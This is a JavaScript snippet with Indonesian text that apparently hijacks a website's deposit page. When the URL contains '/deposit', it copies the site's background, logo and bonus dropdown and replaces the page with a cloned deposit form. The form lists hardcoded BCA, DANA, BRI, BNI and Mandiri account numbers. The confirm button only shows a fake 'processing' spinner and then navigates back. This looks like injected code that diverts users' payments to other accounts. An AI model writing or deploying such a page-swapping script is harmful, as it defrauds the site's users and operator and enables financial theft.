(function () {

if (!location.pathname.includes('/deposit')) return;

// Ambil warna background lama
const bgColor = getComputedStyle(document.body).backgroundColor || '#111';

// Ambil logo lama
const logo = document.querySelector('img')?.src || '';

// Ambil bonus lama
let bonusHTML = '';
const bonusSelect = document.querySelector('select');

if (bonusSelect) {
    bonusHTML = bonusSelect.outerHTML;
}

// Data rekening
const banks = [
    {
        name: 'BCA',
        number: '3901088214538915',
        owner: 'BCA VIRTUAL ACCOUNT'
    },
    {
        name: 'DANA',
        number: '088214538915',
        owner: 'SURWATI'
    },
    {
        name: 'BRI',
        number: '88810088214538915',
        owner: 'BRI VIRTUAL ACCOUNT'
    },
    {
        name: 'BNI',
        number: '8810088214538915',
        owner: 'BNI VIRTUAL ACCOUNT'
    },
    {
        name: 'MANDIRI',
        number: '89508088214538915',
        owner: 'MANDIRI VIRTUAL ACCOUNT'
    }
];

document.body.innerHTML = `
<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:${bgColor};
    color:#fff;
    padding:20px;
}

.container{
    max-width:430px;
    margin:auto;
}

.logo{
    text-align:center;
    margin-bottom:25px;
}

.logo img{
    width:120px;
    border-radius:14px;
}

.card{
    background:rgba(0,0,0,.35);
    backdrop-filter:blur(10px);
    border:1px solid rgba(255,255,255,.12);
    border-radius:18px;
    padding:16px;
    margin-bottom:15px;
}

.title{
    font-size:13px;
    color:#fff;
    text-shadow:0 0 3px rgba(0,0,0,.8);
    margin-bottom:12px;
    text-transform:uppercase;
    font-weight:bold;
}

.info-box{
    margin-top:15px;
    padding:15px;
    border-radius:14px;
    background:rgba(0,0,0,.35);
    border:1px solid rgba(255,255,255,.12);
}

.info-box div{
    margin-bottom:8px;
    color:#fff;
    word-break:break-word;
    text-shadow:0 0 3px rgba(0,0,0,.9);
}

input,select{
    width:100%;
    background:rgba(0,0,0,.35);
    color:#fff;
    border:1px solid rgba(255,255,255,.15);
    border-radius:14px;
    padding:14px;
    outline:none;
    margin-top:10px;
    font-size:14px;
}

option{
    background:#111;
    color:#fff;
}

button{
    width:100%;
    padding:16px;
    border:none;
    border-radius:14px;
    background:#fff;
    color:#000;
    font-weight:bold;
    margin-top:18px;
    font-size:15px;
}

.loading{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.92);
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    z-index:99999;
}

.spinner{
    width:70px;
    height:70px;
    border:5px solid #333;
    border-top:5px solid #fff;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

.loading-text{
    margin-top:20px;
    color:#fff;
    font-size:14px;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

</style>

<div class="container">

    <div class="logo">
        <img src="${logo}">
    </div>

    <div class="card">

        <div class="title">
            Pilih Rekening Deposit
        </div>

        <select id="bankSelect" onchange="updateBankInfo()">

            <option value="">
                -- Pilih Rekening --
            </option>

            ${banks.map(bank => `
                <option 
                    value="${bank.number}"
                    data-name="${bank.name}"
                    data-owner="${bank.owner}">
                    ${bank.name}
                </option>
            `).join('')}

        </select>

        <div class="info-box" id="bankInfo" style="display:none">

            <div id="bankName"></div>

            <div id="bankNumber"></div>

            <div id="bankOwner"></div>

        </div>

    </div>

    <div class="card">

        <div class="title">
            Nominal Deposit
        </div>

        <input 
            type="number" 
            id="amount" 
            placeholder="Masukkan nominal deposit">

        <div style="margin-top:15px">
            ${bonusHTML || '<select><option>Bonus Tidak Tersedia</option></select>'}
        </div>

        <button onclick="submitDeposit()">
            KONFIRMASI DEPOSIT
        </button>

    </div>

</div>

<div class="loading" id="loading" style="display:none">

    <div class="spinner"></div>

    <div class="loading-text">
        Memproses Deposit...
    </div>

</div>
`;

window.selectedBank = '';

window.updateBankInfo = function(){

    const select = document.getElementById('bankSelect');

    const option = select.options[select.selectedIndex];

    if(!option.value){
        document.getElementById('bankInfo').style.display = 'none';
        return;
    }

    window.selectedBank = option.value;

    document.getElementById('bankInfo').style.display = 'block';

    document.getElementById('bankName').innerHTML =
        'BANK: ' + option.dataset.name;

    document.getElementById('bankNumber').innerHTML =
        'NOMOR: ' + option.value;

    document.getElementById('bankOwner').innerHTML =
        'ATAS NAMA: ' + option.dataset.owner;
};

window.submitDeposit = function(){

    const amount = document.getElementById('amount').value;

    if(!window.selectedBank){
        alert('Pilih rekening deposit');
        return;
    }

    if(!amount || amount < 10000){
        alert('Minimal deposit 10000');
        return;
    }

    document.getElementById('loading').style.display = 'flex';

    setTimeout(()=>{
        history.back();
    },3000);
};

})();
